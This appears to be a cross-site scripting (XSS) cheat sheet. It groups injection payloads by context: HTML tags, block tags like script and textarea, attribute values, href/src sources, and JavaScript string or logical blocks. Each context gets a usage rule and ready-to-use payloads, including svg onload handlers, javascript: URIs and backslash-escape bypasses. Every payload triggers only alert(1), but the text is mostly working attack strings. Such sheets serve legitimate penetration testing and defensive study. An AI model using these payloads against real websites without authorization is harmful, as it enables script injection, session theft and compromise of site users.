HTML Context – Simple Tag Injection
Use when input lands inside an attribute’s value of an HTML tag or outside tag except
the ones described in next case.
<svg onload=alert(1)>
"><svg onload=alert(1)>
HTML Context – In Block Tag Injection
Use when input lands inside or between opening/closing of the following tags:
<title><style><script><textarea><noscript><pre><xmp> and <iframe> (</tag> is
accordingly).
</tag><svg onload=alert(1)>
"></tag><svg onload=alert(1)>
HTML Context – Inline Injection
Use when input lands inside an attribute’s value of an HTML tag but that tag can’t be
terminated by greater than sign (>).
"onmouseover=alert(1)//
"autofocus/onfocus=alert(1)//
HTML Context – Source Injection
Use when input lands as a value of the following HTML tag attributes: href, src, data
or action (also formaction). For src in script tag use an external script call (URL) or
“data:,alert(1)”. 2nd payload below alerts out of target’s context for Webkit browsers.
javascript:alert(1)
data:text/html,<svg onload=alert(1)>
Javascript Context – Code Injection
Use when input lands in a script block, inside a string delimited value.
'-alert(1)-'
'-alert(1)//
Javascript Context – Code Injection with Escape Bypass
Use when input lands in a script block, inside a string delimited value but quotes are
escaped by a backslash.
\'-alert(1)//
Javascript Context – Code Injection in Logical Block
Use 1st or 2nd payloads when input lands in a script block, inside a string delimited
value and inside a single logical block like function or conditional (if, else, etc). If
quote is escaped with a backslash, use 3rd payload.
'}alert(1);{'
'}alert(1)%0A{'
\'}alert(1);{//
Javascript Context – Tag Injection
Use when input lands anywhere in a script block.
</script><svg onload=alert(1)>
